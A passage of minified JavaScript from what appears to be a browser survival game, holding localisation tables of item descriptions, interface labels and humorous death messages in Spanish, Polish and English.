                    n[3] = ["Un jugador te ha matado diciendo que mejores.", "Fuiste asesinado por un jugador, pero no te preocupes, ese jugador también morirá, eventualmente."],
                    n[4] = ["Te has acercado demasiado al fuego, y te has quemado vivo, mala idea.", "Has muerto por el fuego, el fuego te quema, ve y escribe una historia sobre eso."],
                    n[5] = ["Tu cuerpo será un buen nido para los huevos de la arañas", "Una araña te ha matado, al menos no fué un conejo."],
                    n[6] = ["El lobo no tendrá hambre después de comerte.", "No son perros, no les gusta ser acariciados."],
                    n[7] = ["El zorro era demasiado rápido para ti.", "El zorro te convirtió en una caja. ¿Desde cuándo los animales tienen poderes mágicos?"],
                    n[8] = ["El oso solo quería un abrazo", "El oso era demasiado para ti. Lo siento."],
                    n[9] = ["El dragón te quemó vivo.", "El dragón te ha aplastado, todos tus huesos ahora son vapor... otro cadaver mas."],
                    n[10] = ["Has saltado a una pared de pinchos, mala idea", "Has muerto por una pared de pinchos. La gente suele ser lo suficientemente sensible para no tocar cosas puntiagudas.."],
                    n[11] = ["Un fantasma también puede morir.", "No has revivido a tiempo, asi que eres un fantasma de un fantasma."],
                    n[12] = ["Una bacteria te ha matado por comer carne cruda. Este juego es muy difícil.", "Has matado a la carne cruda. Ella también te ha matado a ti.."],
                    n[13] = ["Has muerto de sed, mejor bebe tu propia orina."],
                    n[14] = ["¿Sabiás que los jugadores tienen su boca debajo del agua? Ahora lo sabes."],
                    n[15] = ["No te preocupes, a la piraña le pareciste delicioso.", "Las pirañas comen a personas, incluyendote a ti también."],
                    n[16] = ["LapaMauve no planea que puedas matar al kraken", "Un Kraken te partió el kra-neo."],
                    n[17] = ["Tu piel se cayó, el sol te quemó."],
                    n[18] = ["El ajo guardado en tu bolsillo te quemó el cerebro."],
                    n[19] = ["Eres un vampiro, no te quedes cerca del ajo."],
                    n[20] = ["Has comido un ajo siendo  vampiro,¿que esperabas?"],
                    n[21] = ["Te has quedado atrapado en una planta de espinas. Al intentar escapar, tu piel se cae y entra un pincho en tu corazón."],
                    ZOMBIE_GRUMBLE = "Uuunnnggg",
                    ZOMBIE_GRUMBLES = ["Uuunnnggg... Tengo hambre", "Necesito tu cerebro uuunnnggg...", "Carne fresca... Uuunnnggg", "Uuunnnggg... Pareces delicioso", "Uuunnnggg...", "Comida... uuunnnggg...", "Puedo oler sangre... Uuunnnggg"]
            }
            function ge() {
                We[Be.DRAGON_CUBE] = ["You feel a great power emanating from this orb"],
                    n[22] = ["This crab, though frightening in nature, pinched your fingertips so hard that you had a heart attack."],
                    We[Be.CRAB_STICK] = ["Crab sticks", "Oh, yeah? Is there crab in the crab sticks?", "Food: 20"],
                    We[TEXT.BACK_TO_THE_GAME] = " BACK TO THE GAME",
                    We[TEXT.TWITTER] = " Share on Twitter",
                    We[TEXT.FACEBOOK] = " Share on Facebook",
                    We[TEXT.KIT_NEXT] = "You can buy items on the shop in the next game with your points",
                    We[TEXT.POINTS] = "points",
                    We[TEXT.SCORE] = "Score",
                    We[TEXT.KILL] = "Kill",
                    We[TEXT.DAYS_SURVIVED] = "Days survived",
                    We[TEXT.MODE_FREE] = "Building method: Free. Press G to change",
                    We[TEXT.MODE_GRID] = "Building method: Grid. Press G to change",
                    We[Be.CRAB_LOOT] = ["Crab Claw", "Crab claws can also be eaten", "Food: 10"],
                    We[Be.CRAB_SPEAR] = ["Crab Spear", "Allow you to calm crabs, and heal them", "Damage: 14", "Building Damage: 4"],
                    We[Be.CROWN_CRAB] = ["Crab Helmet", "You are the king of crabs!", "Crabs follow you", "They can't hit you and you can't hit them", "Players Defense: 4", "Animals Defense: 13"],
                    We[Be.BED] = ["Bed", "Relax in this confortable bed", "You are less cold, less thirsty, and less hungry", "You will be cured faster", "Durability: 400"],
                    document.getElementById("typequest").innerHTML = "Chrono Quests",
                    document.getElementById("timeremainingquest").innerHTML = "Time Remaining",
                    document.getElementById("constraintquest").innerHTML = " Constraints",
                    document.getElementById("claim_rewards").innerHTML = " Claim rewards",
                    document.getElementById("rewardquest").innerHTML = " Reward",
                    document.getElementById("killdragon_1").innerHTML = " Collect 1 dragon heart",
                    document.getElementById("amethyst_2").innerHTML = " Gather 1 amethyst",
                    document.getElementById("survive20min_3").innerHTML = "Survive without losing life",
                    document.getElementById("treasure_chest_4").innerHTML = " Open 5 treasure chests",
                    document.getElementById("dont_hit_5").innerHTML = " Be peaceful",
                    document.getElementById("bread_6").innerHTML = " Collect 100 bread in deep winter",
                    document.getElementById("winter_7").innerHTML = " After 1 day, survive in winter";
                for (var e = 0; e < 7; e++)
                    document.getElementById("claim_reward_" + e).innerHTML = "CLAIM REWARD!";
                document.getElementById("quit_chronoquest").innerHTML = " QUIT",
                    We[Be.HAND] = ["Ręka"],
                    We[Be.GROUND] = ["Ziemia", "Brudna!"],
                    We[Be.SAND] = ["Piasek", "Mam go w oczach!"],
                    We[Be.WOOD] = ["Drewno", "Nie możesz mieć go wystarczająco!"],
                    We[Be.STONE] = ["Kamień", "Także nazywany skałą"],
                    We[Be.GOLD] = ["Złoto", "Bądź hojny, daj trochę innym"],
                    We[Be.DIAMOND] = ["Diament", "Co z nim zrobisz?"],
                    We[Be.AMETHYST] = ["Ametyst", "Jest Fiołkowy jak Lapa"],
                    We[Be.FLOUR] = ["Mąka", "Używana w gotowaniu"],
                    We[Be.COOKIE] = ["Ciastko", "Przepyszne ciasteczko od babci", "Jedzenie: 50"],
                    We[Be.CAKE] = ["Ciasto", "Raj dla smakoszy", "Jedzenie: 100"],
                    We[Be.MEAT] = ["Surowe mięso", "Możesz je upiec w ogniu", "Powoduje zatrucie pokarmowe: 10", "Jedzenie: 15"],
                    We[Be.COOKED_MEAT] = ["Pieczone mięso", "Krwisty stek, proszę", "Jedzenie: 35"],
                    We[Be.FOODFISH] = ["Surowa ryba", "Myślę, że nadal jest żywa", "Powoduje zatrucie pokarmowe: 10", "Jedzenie: 18"],
                    We[Be.FOODFISH_COOKED] = ["Pieczona ryba", "Z cytryną jest idealna", " Jedzenie: 35"],
                    We[Be.BREAD] = ["Chleb", "Świetny Francuski chleb", "Jest walutą używaną w markecie", "Jedzenie: 15"],
                    We[Be.SANDWICH] = ["Kanapka", "Smakuje jak kraboburger", "Jedzenie: 100"],
                    We[Be.CANDY] = ["Cukierki", "Tylko dla dzieci!", "Jedzenie: 100"],
                    We[Be.SUGAR_CAN] = ["Laska cukrowa", "Spróbuj, jest przepyszna", "Jedzenie: 100"],
                    We[Be.GARLAND] = ["Girlanda", "Idealna do dekorowania dachów"],
                    We[Be.SEED] = ["Nasionko jagody", "Wyrośnie w jagody", "Narodziny: 2min", "Rośnięcie: 55s", "Podlewanie: 3min 20s", "Wytrzymałość: 700", "Czas życia: 8 dni"],
                    We[Be.PLANT] = ["Jagody", "Jagody są pyszne!", "Jedzenie: 10"],
                    We[Be.WHEAT_SEED] = ["Nasiono pszenicy", "Wyrośnie w pszenicę", "Narodziny: 2min", "Rośnięcie: 16s", "Podlewanie: 2min", "Wytrzymałość: 700", "Czas życia: 8 dni"],
                    We[Be.WILD_WHEAT] = ["Pszenica", "Zamienia się w mąkę jeżeli wrzucisz ją do wiatraka"],
                    We[Be.PUMPKIN_SEED] = ["Nasiono dyni", "Wyrośnie w dynię", "Narodziny: 2min 40s", "Rośnięcie: 2min", "Podlewanie: 2min", "Wytrzymałość: 700", "Czas życia: 8 dni"],
                    We[Be.PUMPKIN] = ["Dynia", "Przypomina mi o Halloween", "Jedzenie: 30"],
                    We[Be.GARLIC_SEED] = ["Nasionko czosnku", "Bardzo niebezpieczne dla wampirów", "Obrażenia: 20", "Narodziny: 4min", "Rośnięcie: 1min 10s", "Podlewanie: 1min 40s", "Wytrzymałość: 700", "Czas życia: 8 dni"],
                    We[Be.GARLIC] = ["Czosnek", "Leczy cię i redukuje zimno", "Jedzenie: 14", "Uzdrawia z biegiem czasu: 30", "Efekt: 1"],
                    We[Be.THORNBUSH_SEED] = ["Nasiono kolczastego krzewu", "Może zranić twoich wrogów", "Obrażenia: 20", "Narodziny: 4min", "Rośnięcie: 15s", "Podlewanie: 3min", "Wytrzymałość: 1000", "Czas życia: 8 dni"],
                    We[Be.THORNBUSH] = ["Kolczasty krzew", "Kłuje!"],
                    We[Be.PLOT] = ["Donica", "Naprawdę, użyj jej", "Z tym genetycznie modyfikowanym nawozem, twoje rośliny", "będą rosły znacznie szybciej i będą potrzebować mniej wody", "Wytrzymałość: 2000"],
                    We[Be.ICE] = ["Lód", "Użyteczny do robienia ciast i wody"],
                    We[Be.SPANNER] = ["Klucz mechaniczny", "Do naprawiania drzwi i kolców", "Uszkodzenie: 2"],
                    We[Be.FUR_WOLF] = ["Wilcza skóra", "Szczeniaczek? Ale gdzie jest szczeniaczek?!"],
                    We[Be.FUR] = ["Skóra królika", "Ten królik był taki słodziutki..."],
                    We[Be.SPECIAL_FUR] = ["Skóra", "Jesteś fabryką chleba"],
                    We[Be.SPECIAL_FUR_2] = ["Ciemna skóra", "Byłeś gotowy zrobić coś złego"],
                    We[Be.FUR_WINTER] = ["Zimowa skóra", "Te zwierzęta chciały się tylko przytulić..."],
                    We[Be.SCALES] = ["Łuski", "Pachnie jak ryba!"],
                    We[Be.KRAKEN_SKIN] = ["Skóra krakena", "Nie byłeś zbyt przestraszony?"],
                    We[Be.FIRE] = ["Ognisko", "Ociepli cię!", "Wytrzymałość: 150", "Czas życia: 2min"],
                    We[Be.BIG_FIRE] = ["Duże ognisko", "Ociepli cię na dłużej!", "Wytrzymałość: 400", "Czas życia: 6min"],
                    We[Be.WORKBENCH] = ["Stół rzemieślniczy", "Użyteczny do stwarzania przedmiotów"],
                    We[Be.CORD] = ["Nić", "Używany w tworzeniu czapek i plecaków"],
                    We[Be.BLUE_CORD] = ["Diamentowa nić", "Używana w tworzeniu specjalnych czapek"],
                    We[Be.CHEST] = ["Skrzynia", "Pozwala ci na przechowywanie przedmiotów", "Wytrzymałość: 500"],
                    We[Be.SWORD_WOOD] = ["Drewniany miecz", "To coś działa?", "Obrażenia: 12", "Obrażenia do budowli: 4"],
                    We[Be.SWORD] = ["Kamienny miecz", "Bądź miły dla innych", "Obrażenia: 19", "Obrażenia do budowli: 6"],
                    We[Be.SWORD_GOLD] = ["Złoty miecz", "Król lasu", "Obrażenia: 22", "Obrażenia do budowli: 7"],
                    We[Be.SWORD_DIAMOND] = ["Diamentowy miecz", "Możesz poczuć moc", "Obrażenia: 24", "Obrażenia do budowli: 8"],
                    We[Be.PIRATE_SWORD] = ["Piracki miecz", "Ayyyyy!", "Dłuższy niż zwykły miecz", "Obrażenia: 24", "Obrażenia do budowli: 8"],
                    We[Be.SWORD_AMETHYST] = ["Ametystowy miecz", "fiołkowy to najpiękniejszy kolor na świecie", "Damage: 27", "Obrażenia do budowli: 9"],
                    We[Be.DRAGON_SWORD] = ["Smoczy miecz", "Bez litości!", "Obrażenia: 30", "Obrażenia do budowli: 10"],
                    We[Be.DRAGON_SPEAR] = ["Smocza włócznia", "Zabij ich wszystkich!", "Obrażenia: 22", "Obrażenia do budowli: 6"],
                    We[Be.PICK_WOOD] = ["Drewniany kilof", "Może wydobywać tylko kamienie i drewno", "Obrażenia: 1"],
                    We[Be.PICK] = ["Kamienny kilof", "Może wydobywać drewno, kamienie i złoto", "Obrażenia: 2"],
                    We[Be.PICK_GOLD] = ["Złoty kilof", "Może także wydobywać diamenty", "Obrażenia: 3", "Obrażenia do budowli: 1"],
                    We[Be.PICK_DIAMOND] = ["Diamentowy kilof", "Może wydobywać wszystko", "Obrażenia: 4", "Obrażenia do budowli: 1"],
                    We[Be.PICK_AMETHYST] = ["Ametystowy kilof", "Może wydobywać wszystko. Wygląda fantastycznie!", "Obrażenia: 5", "Obrażenia do budowli: 1"],
                    We[Be.HAMMER] = ["Kamienny młot", "Pomocny w niszczeniu budowli", "Nie działa najlepiej na ametyście", "Obrażenia: 2", "Obrażenia do budowli: 20"],
                    We[Be.HAMMER_GOLD] = ["Złoty młot", "Pomocny w niszczeniu budowli", "Nie działa najlepiej na ametyście", "Obrażenia: 3", "Obrażenia do budowli: 30"],
                    We[Be.HAMMER_DIAMOND] = ["Diamentowy młot", "Pomocny w niszczeniu budowli", "Obrażenia: 4", "Obrażenia do budowli: 40"],
                    We[Be.HAMMER_AMETHYST] = ["Ametystowy młot", "Pomocny w niszczeniu budowli", "Obrażenia: 5", "Obrażenia do budowli: 50"],
                    We[Be.SUPER_HAMMER] = ["Super młot", "Miałeś kiedyś plan zniszczenia świata?", "Obrażenia: 12", "Obrażenia do budowli: 70"],
                    We[Be.WOOD_SPEAR] = ["Drewniana włócznia", "Jak patyk, ale kłuje.", "Obrażenia: 10", "Obrażenia do budowli: 2"],
                    We[Be.SPEAR] = ["Kamienna włócznia", "Początek ewolucji!", "Obrażenia: 14", "Obrażenia do budowli: 4"],
                    We[Be.GOLD_SPEAR] = ["Złota włócznia", "Uważaj, kłuje!", "Obrażenia: 15", "Obrażenia do budowli: 5"],
                    We[Be.DIAMOND_SPEAR] = ["Diamentowa włócznia", "Jesteś gotowy, aby zabić smoka", "Obrażenia: 17", "Obrażenia do budowli: 5"],
                    We[Be.AMETHYST_SPEAR] = ["Ametystowa włócznia", "Smoki już nie są dla ciebie zagrożeniem", "Obrażenia: 18", "Obrażenia do budowli: 6"],
                    We[Be.SHOVEL] = ["Kamienna łopata", "Kop w ziemi aby zdobyć ziemię, lód i piasek", "Możesz także zdobyć minerały", "Obrażenia: 2"],
                    We[Be.SHOVEL_GOLD] = ["Złota łopata", "Kop w ziemi aby zdobyć ziemię, lód i piasek", "Możesz także zdobyć minerały", "Obrażenia: 3", "Obrażenia do budowli: 1"],
                    We[Be.SHOVEL_DIAMOND] = ["Diamentowa łopata", "Kop w ziemi aby zdobyć ziemię, lód i piasek", "Możesz także zdobyć minerały", "Obrażenia: 4", "Obrażenia do budowli: 1"],
                    We[Be.SHOVEL_AMETHYST] = ["Ametystowa łopata", "Kop w ziemi aby zdobyć ziemię, lód i piasek", "Możesz także zdobyć minerały", "Obrażenia: 5", "Obrażenia do budowli: 1"],
                    We[Be.WOOD_HELMET] = ["Drewniany hełm", "Lepsze niż nic", "Obrona przed graczami: 1", "Obrona przed zwierzętami: 4"],
                    We[Be.STONE_HELMET] = ["Kamienny hełm", "Jesteś gotowy do bitwy!", "Obrona przed graczami: 2", "Obrona przed zwierzętami: 8"],
                    We[Be.GOLD_HELMET] = ["Złoty hełm", "Zwany także hełmem barbarzyńców", "Obrona przed graczami: 4", "Obrona przed zwierzętami: 13"],
                    We[Be.DIAMOND_HELMET] = ["Diamentowy hełm", "Nie przechwalaj się za bardzo", "Obrona przed graczami: 5", "Obrona przed zwierzętami: 19"],
                    We[Be.AMETHYST_HELMET] = ["Ametystowy hełm", "Nie boisz się już niczego", "Obrona przed graczami: 6", "Obrona przed zwierzętami: 23"],
                    We[Be.DRAGON_HELMET] = ["Smoczy hełm", "Zmierzysz się z całym światem", "Obrona przed graczami: 8", "Obrona przed zwierzętami: 27"],
                    We[Be.EXPLORER_HAT] = ["Czapka odkrywcy", "Zwierzęta nie będą zwracały na ciebie uwagi", "ale nie rób hałasu!", "Ciepło w i poza zimą"],
                    We[Be.CHRISTMAS_HAT] = ["świąteczna czapka", "Oh, oh, oh, Wesołych Świąt", "Ciepło w i poza zimą"],
                    We[Be.ELF_HAT] = ["Czapka elfa", "Nie pozwól się być wykorzystywanym, mały śnieżny elfie!", "Ciepło w i poza zimą"],
                    We[Be.HOOD] = ["Kaptur", "Jesteś łobuzem", "Możesz coś komuś ukraść jeśli", "- Jest noc", "- Nic przy sobie nie masz", "- Jeżeli nic przez chwilę nie dotykałeś", "- Nie jesteś blisko ognia", "- Twój cel nie jest ubrany w chłopską tunikę", "Jest ciepło w i poza zimą"],
                    We[Be.EARMUFFS] = ["Nauszniki", "Jakiś inny rodzaj małej czapki.", "Ciepło w i poza zimą"],
                    We[Be.COAT] = ["Czapka", "Także nazywana płaszczem.", "Ciepła w i poza zimą"],
                    We[Be.CAP_SCARF] = ["Szal i czapka", "Bardzo wygodna, bardzo ciepła"],
                    We[Be.PEASANT] = ["Chłopska tunika", "Twoje rośliny rosną szybciej", "Ciepła w i poza zimą"],
                    We[Be.WINTER_HOOD] = ["Zimowy kaptur", "Możesz coś komuś ukraść jeśli", "- Jest noc", "- Nic przy sobie nie masz", "- Jeżeli nic przez chwilę nie dotykałeś", "- Nie jesteś blisko ognia", "- Twój cel nie jest ubrany w tunikę zimowego chłopa", "Jest ciepło w i poza zimą"],
                    We[Be.WINTER_PEASANT] = ["Zimowa chłopska tunika", "Twoje rośliny rosną szybciej", "Ciepło w i poza zimą"],
                    We[Be.DIVING_MASK] = ["Maska do nurkowania", "Jesteś szybki w wodzie", "Ciepło", "Obrona przed graczami: 2, Obrona przed zwierzętami: 8"],
                    We[Be.SUPER_DIVING_SUIT] = ["Strój głębinowy", "Jesteś bardzo szybki w wodzie", "Ciepło ci w wodzie", "Obrona przed graczami: 4, Obrona przed zwierzętami: 16"],
                    We[Be.DRAGON_ORB] = ["Smocza kula", "Zdobyta podczas zadania"],
                    We[Be.DRAGON_HEART] = ["Smocze serce", "Zamienia cię w ducha po śmierci!", "Jesteś duchem na 60 sekund", "Znajdź kamień rezurekcyjny"],
                    We[Be.GEMME_GREEN] = ["Zielony kryształ", "Nie oszukiwałeś, przysięgasz?"],
                    We[Be.GEMME_ORANGE] = ["Pomarańczowy kryształ", "Tylko prawdziwy pirat może go znaleźć!"],
                    We[Be.GEMME_BLUE] = ["Niebieski kryształ", "Dla zbyt miłych ludzi"],
                    We[Be.CROWN_GREEN] = ["Zielona korona", "Szybko się leczysz", "Uzdrawia z biegiem czasu: 40", "Obrona przed graczami: 4, Obrona przed zwierzętami: 16"],
                    We[Be.CROWN_ORANGE] = ["Pomarańczowa korona", "Nagle poczułeś smak szczęścia", "Obrona przed graczami: 4, Obrona przed zwierzętami: 16"],
                    We[Be.CROWN_BLUE] = ["Niebieska korona", "Gdy już będziesz martwy, zamienisz się w ducha", "Przy okazji stracisz swoją broń i kilof", "Obrona przed graczami: 4, Obrona przed zwierzętami: 16"],
                    We[Be.BUCKET_FULL] = ["Wiadro", "Również przydatne do napełnienia studni", "Jedno wiadro jest jak dwanaście butelek"],
                    We[Be.BUCKET_EMPTY] = ["Puste wiadro", "Musisz napełnić to wiadro wodą"],
                    We[Be.BOTTLE_FULL] = ["Butelka", "Pozwala pić wodę wszędzie", "Woda: 50"],
                    We[Be.BOTTLE_EMPTY] = ["Pusta butelka", "Możesz napełnić tą butelkę blisko źródła wody"],
                    We[Be.WATERING_CAN] = ["Pusta konewka", "Musisz ją napełnić w źródle wody, aby ją użyć"],
                    We[Be.WATERING_CAN_FULL] = ["Konewka", "Pozwala podlewać rośliny", "Obrażenia: 1"],
                    We[Be.BAG] = ["Plecak", "Więcej miejsca na twoje przedmioty!"],
                    We[Be.PAPER] = ["Papier", "Używany w tworzeniu książki"],
                    We[Be.BOOK] = ["Książka", "Pozwala znacznie skrócić wytwarzanie", "Musisz ją nosić by zadziałała", "Uszkodzenie 1"],
                    We[Be.BANDAGE] = ["Bandaż", "Szybciej zregeneruj życie", "Uzdrawia z biegiem czasu: 30", "Efekt: 5"],
                    We[Be.LOCK] = ["Zamek", "Pozwala ci zamknąć skrzynię"],
                    We[Be.LOCKPICK] = ["Wytrych", "Pozwala ci odblokować jedną skrzynię"],
                    We[Be.TOTEM] = ["Totem", "Pozwala ci stworzyć drużynę", "Dziel się drzwiami i zamkniętymi skrzyniami", "Szkodliwe budynki nie zranią twoich przyjaciół"],
                    We[Be.BRIDGE] = ["Most", "Bardzo przydatny w wodzie", "Pozwala ci pić bez utonięcia", "Chodzisz szybciej w wodzie"],
                    We[Be.SIGN] = ["Tabliczka", "Zostaw wiadomość dla innych", "Wytrzymałość: 200"],
                    We[Be.ROOF] = ["Dach", "Trochę cie ogrzewa i chowa!"],
                    We[Be.WELL] = ["Studnia", "Umożliwia napełnienie butelki", "Wytrzymałość: 1000"],
                    We[Be.WALL] = ["Drewniany mur", "Znasz taniec ścian?", "Wytrzymałość: 1000"],
                    We[Be.STONE_WALL] = ["Kamienny mur", "Jest to trochę bardziej poważniejsze.", "Wytrzymałość: 1500"],
                    We[Be.GOLD_WALL] = [" Złoty mur", "Złoto na twoich murach? To trochę krzykliwe.", "Wytrzymałość: 2000"],
                    We[Be.DIAMOND_WALL] = ["Diamentowy mur", "Jaki błyszczący, uważaj na oczy", "Wytrzymałość: 2500"],
                    We[Be.AMETHYST_WALL] = ["Ametystowy mur", "Musisz bardzo się bać, aby wyjść!", "Wytrzymałość: 3000"],
                    We[Be.SPIKE] = ["Drewniany kolczasty mur", "Może uszkodzić wrogów", "Obrażenia: 10, Obrażenia po uszkodzeniu: 2", "Wytrzymałość: 150"],
                    We[Be.STONE_SPIKE] = ["Kamienny kolczasty mur", "Nie chciałbym być twoim wrogiem.", "Obrażenia: 20", " Obrażenia po uszkodzeniu: 3", "Wytrzymałość: 300"],
                    We[Be.GOLD_SPIKE] = ["Złoty kolczasty mur", "Jesteśtaki okrutny.", "Obrażenia: 30", " Obrażenia po uszkodzeniu: 3", "Wytrzymałość: 600"],
                    We[Be.DIAMOND_SPIKE] = ["Diamentowy kolczasty mur", "Raczej nie lubisz towarzystwa.", "Obrażenia: 40", "Obrażenia po uszkodzeniu: 4", "Wytrzymałość: 1200"],
                    We[Be.AMETHYST_SPIKE] = ["Ametystowy kolczasty mur", "Co ci sąsiedzi ci zrobili?", "Obrażenia: 50", "Obrażenia po uszkodzeniu: 4", "Wytrzymałość: 2400"],
                    We[Be.WOOD_DOOR] = ["Drewniane drzwi", "Może być otwarte przez ciebie lub przyjaciół", "Wytrzymałość: 1000"],
                    We[Be.STONE_DOOR] = ["Kamienne drzwi", "Solidne drzwi są bardziej poważne ", "Wytrzymałość: 1500"],
                    We[Be.GOLD_DOOR] = ["Złote drzwi", "Czy odbudowujesz El Dorado?", "Wytrzymałość: 2000"],
                    We[Be.DIAMOND_DOOR] = ["Diamentowe drzwi", "Dla błyszczącego domu", "Wytrzymałość: 2500"],
                    We[Be.AMETHYST_DOOR] = ["Ametystowe drzwi", "Czy twój dom to zamknięty sejf?", "Wytrzymałość: 3000"],
                    We[Be.FURNACE] = ["Piec", "Ogrzewa cię", "Zużywa drewno co 5 sekund", "Wytrzymałość: 1000"],
                    We[Be.WINDMILL] = ["Młyn", "Może produkować mąkę z pszenicy", "Przygotowanie mąki zajmuje 5 sekund", "Zwraca punkty podczas pracy", "Wytrzymałość: 2000"],
                    We[Be.BREAD_OVEN] = ["Piec do chleba", "Pozwala na wypiek chleba z mąki", "Przygotowanie chleba zajmuje 10 sekund", "Zwraca punkty podczas pracy", "Wytrzymałość: 2000"],
                    We[Be.RESURRECTION] = ["Kamień rezurekcyjny", "To magia", "Wskrzesi cię jeśli jesteś duchem", "Stracisz swoja broń i kilof", "Wytrzymałość: 200"],
                    We[TEXT.YOU_CANNOT_JOIN] = "Nie możesz dołączyć do tego serwera",
                    We[TEXT.KICKED] = "Wyrzucony: ",
                    We[TEXT.KEY_ALREADY] = "Twój klucz jest aktualnie używany przez innego gracza",
                    We[TEXT.KEY_WRONG] = "Twój klucz jest nieprawidłowy",
                    We[TEXT.OLD_VERSION] = "Posiadasz starszą wersję, musisz wyczyścić swoją pamięć",
                    We[TEXT.NO_MORE_RESOURCES] = "Nie ma nowych minerałów, zwierząt, i jedzenia",
                    We[TEXT.SURVIVED_1DAY] = "Przeżyłeś 1 dzień",
                    We[TEXT.SURVIVED] = "Przeżyłeś ",
                    We[TEXT.DAYS] = " dni",
                    We[TEXT.DEAD_SAD] = "Jesteś martwy ;-;",
                    We[TEXT.SPAM_ME] = "Serwer nie może znaleźć miejsca na spawn! Spamuj przycisk zagraj! Lub wybierz inny serwer...",
                    We[TEXT.SPAM_ME2] = "Serwer jest pełny! Spamuj przycisk zagraj!",
                    We[TEXT.EMPTY] = "Źródło jest puste",
                    We[TEXT.INV_FULL] = "Ekwipunek jest pełny (użyj prawego przycisku myszy, żeby wyrzucić przedmiot)",
                    We[TEXT.DEAD] = " jest martwy",
                    We[TEXT.WRONG_TOOL] = "To nie jest właściwe narzędzie",
                    We[TEXT.JOIN_TEAM] = "Dołączyłeś do drużyny",
                    We[TEXT.YOU_DEAD] = "Jesteś martwy",
                    We[TEXT.JOINED_TEAM] = " dołączył do drużyny",
                    We[TEXT.TEAM_DESTROYED] = "Twoja drużyna została zniszczona",
                    We[TEXT.LEFT_TEAM] = " Opuściłeś drużynę",
                    We[TEXT.LEFT_TEAM2] = " opuścił drużynę",
                    We[TEXT.TOKEN] = "Ktoś ukradł twój żeton :>",
                    We[TEXT.CHOOSE] = "Wybierz serwer",
                    We[TEXT.PLAYERS] = "graczy",
                    We[TEXT.TOTAL_PLAYERS] = "wszystkich graczy",
                    We[TEXT.TOTAL_MODE] = "graczy w tym trybie",
                    We[TEXT.COMMING_SOON] = "Już wkrótce...",
                    document.getElementById("nickname_input").placeholder = "Przydomek",
                    n[0] = ["Zostałeś zabity bez powodu"],
                    n[1] = ["Umarłeś z głodu, jak nazwa gry wskazuje"],
                    n[2] = ["Zamarzłeś na śmierć. Ale smutne", "Masz hipotermię. Następnym razem, zamiast tego spróbuj siedzieć obok ogniska."],
                    n[3] = ["Gracz zabił cię, mówiąc ci 'git gud.' ", "Zostałeś zamordowany przez gracza. Nie martw się, ten gracz też zginie, ewentualnie."],
                    n[4] = ["Byłeś za blisko ogniska i spłonąłeś. Zły pomysł.", "Zginąłeś od ognia. Ogień cię rani. Idź i napisz o tym historię."],
                    n[5] = ["Twoje ciało stało się gniazdem dla pajęczych jaj", "Pająk cię zabił. Przynajmniej to nie był królik."],
                    n[6] = ["Wilk już nie będzie głodował po zjedzeniu cię", "To nie są pieski.Wilki nie lubią jak się je głaszcze."],
                    n[7] = ["Lis był dla ciebie za szybki", "Lis zmienił cię w pudło.Od kiedy zwierzęta mają magiczne zdolności?"],
                    n[8] = ["Niedźwiedź chciał się tylko przytulić.", "Niedźwiedź był biedny. Nie jest mi przykro."],
                    n[9] = ["Zostałeś spalony na popiół przez smoka. Jakie to smutne.", "Zostałeś spłaszczony przez smoka. Być zmiażdżonym to okropny sposób na śmierć."],
                    n[10] = ["Wskoczyłeś na kolczasty mur. Niezbyt dobry pomysł...", "Zostałeś zabity przez kolczasty mur. Większość ludzi ludzi jest wystarczająco rozsądna, aby nie dotykać spiczastych rzeczy."],
                    n[11] = ["Nawet duch potrafi umrzeć.", "Nie udało ci się dokonać rezurekcji. To jest gra, więc żyjesz po śmierci, więc..."],
                    n[12] = ["Bakterie z twojego surowego mięsa zabiły cię. Ta gra jest zdecydowanie za trudna.", "Ty zabiłeś surowe mięso. Ono zabiło ciebię."],
                    n[13] = ["Zginąłeś z pragnienia. Lepiej pić własny mocz."],
                    n[14] = ["Czy wiedziałeś, że usta głodomorka są zawsze pod wodą podczas pływania? Teraz wiesz."],
                    n[15] = ["Nie martw się, zasmakowałeś pirani.", "Zabawny fakt: Piranie jedzą ludzi, włączając ciebie."],
                    n[16] = ["LapaMauve nie planuje abyś mógł zabić krakena", "Kraken rozwalił twoją czaszkę."],
                    n[17] = ["Twoja skóra odpada, słońce cię zabija."],
                    n[18] = ["Czosnek w twoich kieszeniach  ugotował ci mózg."],
                    n[19] = ["Jako wampir, nie stałbym blisko ząbków czosnku."],
                    n[20] = ["Zjadłeś czosnek jako wampir, czego oczekiwałeś?"],
                    n[21] = ["Twoje ciało owija się w cierniste krzaki.Kiedy próbujesz uciec,twoja skóra odpada i twoje serce przestaje bić."],
                    ZOMBIE_GRUMBLE = "Uuunnnggg",
                    ZOMBIE_GRUMBLES = ["Uuunnnggg... Głoduję", "Potrzebuję twojego mózgu Uuunnnggg...", "Świeże mięso tutaj.. Uuunnnggg", "Uuunnnggg... Jesteś pyszny", "Uuunnnggg...", "Jeść... uuunnnggg...", "Czuję krew... Uuunnnggg"]
            }
            function pe() {
                We[Be.DRAGON_CUBE] = ["You feel a great power emanating from this orb"],
                    n[22] = ["This crab, though frightening in nature, pinched your fingertips so hard that you had a heart attack."],
                    We[Be.CRAB_STICK] = ["Crab sticks", "Oh, yeah? Is there crab in the crab sticks?", "Food: 20"],
                    We[TEXT.BACK_TO_THE_GAME] = " BACK TO THE GAME",
                    We[TEXT.TWITTER] = " Share on Twitter",
                    We[TEXT.FACEBOOK] = " Share on Facebook",
                    We[TEXT.KIT_NEXT] = "You can buy items on the shop in the next game with your points",
                    We[TEXT.POINTS] = "points",
                    We[TEXT.SCORE] = "Score",
                    We[TEXT.KILL] = "Kill",
                    We[TEXT.DAYS_SURVIVED] = "Days survived",
                    We[TEXT.MODE_FREE] = "Building method: Free. Press G to change",
                    We[TEXT.MODE_GRID] = "Building method: Grid. Press G to change",
                    We[Be.CRAB_LOOT] = ["Crab Claw", "Crab claws can also be eaten", "Food: 10"],
                    We[Be.CRAB_SPEAR] = ["Crab Spear", "Allow you to calm crabs, and heal them", "Damage: 14", "Building Damage: 4"],
                    We[Be.CROWN_CRAB] = ["Crab Helmet", "You are the king of crabs!", "Crabs follow you", "They can't hit you and you can't hit them", "Players Defense: 4", "Animals Defense: 13"],
                    We[Be.BED] = ["Bed", "Relax in this confortable bed", "You are less cold, less thirsty, and less hungry", "You will be cured faster", "Durability: 400"],
                    document.getElementById("typequest").innerHTML = "Chrono Quests",
                    document.getElementById("timeremainingquest").innerHTML = "Time Remaining",
                    document.getElementById("constraintquest").innerHTML = " Constraints",
                    document.getElementById("claim_rewards").innerHTML = " Claim rewards",
                    document.getElementById("rewardquest").innerHTML = " Reward",
                    document.getElementById("killdragon_1").innerHTML = " Collect 1 dragon heart",
                    document.getElementById("amethyst_2").innerHTML = " Gather 1 amethyst",
